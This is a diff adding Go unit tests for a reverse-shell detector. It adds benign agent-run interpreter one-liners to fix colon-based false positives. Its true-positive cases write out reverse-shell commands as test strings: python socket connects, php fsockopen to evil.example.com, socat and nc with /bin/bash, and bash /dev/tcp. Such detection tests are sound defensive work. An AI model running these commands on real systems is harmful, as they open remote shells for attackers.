@@ -34,6 +34,74 @@ func TestDetectReverseShells(t *testing.T) {
 			},
 			wantCount: 0,
 		},
+
+		// Issue #842: agent Bash tools wrap commands in a shell-snapshot line and
+		// quote code that almost always contains ':' (PATH entries, dict/JSON
+		// literals, URLs, log text). A bare-':' network heuristic turned every
+		// agent-run interpreter one-liner into a kill-on-sight false positive.
+		// These benign commands must NOT be flagged.
+		{
+			name: "benign python3 -c with PATH colon (issue #842)",
+			processes: []Process{
+				{PID: 1234, User: "1000", Command: `/bin/bash -c source /home/code/.claude/shell-snapshots/snapshot-bash-1.sh 2>/dev/null || true && export PATH=/usr/local/bin:/usr/bin:/bin && python3 -c "print(2+2)"`},
+			},
+			wantCount: 0,
+		},
+		{
+			name: "benign python -c with dict literal colon (issue #842)",
+			processes: []Process{
+				{PID: 1234, User: "1000", Command: `python3 -c import json; print(json.dumps({"ok": True}))`},
+			},
+			wantCount: 0,
+		},
+		{
+			name: "benign claude launcher echoing python -c in the prompt (issue #842)",
+			processes: []Process{
+				{PID: 1234, User: "1000", Command: `claude -p run python -c "print('hello: world')" to verify the fix`},
+			},
+			wantCount: 0,
+		},
+		{
+			name: "benign perl/ruby/php one-liners without network indicators (issue #842)",
+			processes: []Process{
+				{PID: 1, User: "1000", Command: `perl -e print "time: ", scalar localtime, "\n"`},
+				{PID: 2, User: "1000", Command: `ruby -e puts({a: 1, b: 2})`},
+				{PID: 3, User: "1000", Command: `php -r echo date("H:i:s");`},
+			},
+			wantCount: 0,
+		},
+
+		// True positives must survive the tightened heuristic: real reverse
+		// shells all carry a socket/tcp/udp/connect keyword, an IP, or a
+		// host:port endpoint.
+		{
+			name: "python reverse shell with socket+IP",
+			processes: []Process{
+				{PID: 1234, User: "1000", Command: `python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444))`},
+			},
+			wantCount: 1,
+		},
+		{
+			name: "php reverse shell via fsockopen to host:port",
+			processes: []Process{
+				{PID: 1234, User: "1000", Command: `php -r $s=fsockopen("evil.example.com",4444);exec("/bin/sh -i <&3 >&3 2>&3")`},
+			},
+			wantCount: 1,
+		},
+		{
+			name: "socat tcp exec reverse shell",
+			processes: []Process{
+				{PID: 1234, User: "1000", Command: `socat TCP4:1.2.3.4:4444 EXEC:/bin/bash`},
+			},
+			wantCount: 1,
+		},
+		{
+			name: "interactive bash shell flagged regardless of network indicator",
+			processes: []Process{
+				{PID: 1234, User: "1000", Command: `bash -i`},
+			},
+			wantCount: 1,
+		},
 	}
 
 	for _, tt := range tests {
@@ -41,6 +109,35 @@ func TestDetectReverseShells(t *testing.T) {
 			threats := DetectReverseShells(tt.processes)
 			if len(threats) != tt.wantCount {
 				t.Errorf("DetectReverseShells() got %d threats, want %d", len(threats), tt.wantCount)
+			}
+		})
+	}
+}
+
+func TestIsNetworkRelated(t *testing.T) {
+	tests := []struct {
+		name string
+		cmd  string
+		want bool
+	}{
+		// Benign colons that previously tripped the bare-':' check (issue #842).
+		{"PATH separator", `export path=/usr/local/bin:/usr/bin:/bin && python3 -c print(1)`, false},
+		{"json/dict literal", `python3 -c print({"ok": true})`, false},
+		{"log-style colon", `python3 -c print("hello: world")`, false},
+		{"time literal", `php -r echo date("h:i:s");`, false},
+		// Genuine network indicators.
+		{"socket keyword", `python3 -c import socket`, true},
+		{"tcp keyword", `socat tcp4:host:4444 exec:/bin/sh`, true},
+		{"udp keyword", `nc -u 1.2.3.4 53`, true},
+		{"connect keyword", `s.connect(("host",4444))`, true},
+		{"bare ipv4", `nc -e /bin/bash 192.168.1.100 4444`, true},
+		{"ipv4 host:port", `bash -i >& /dev/tcp/10.0.0.1/4444`, true},
+		{"dotted hostname:port", `curl evil.example.com:4444`, true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := isNetworkRelated(strings.ToLower(tt.cmd)); got != tt.want {
+				t.Errorf("isNetworkRelated(%q) = %v, want %v", tt.cmd, got, tt.want)
 			}
 		})
 	}
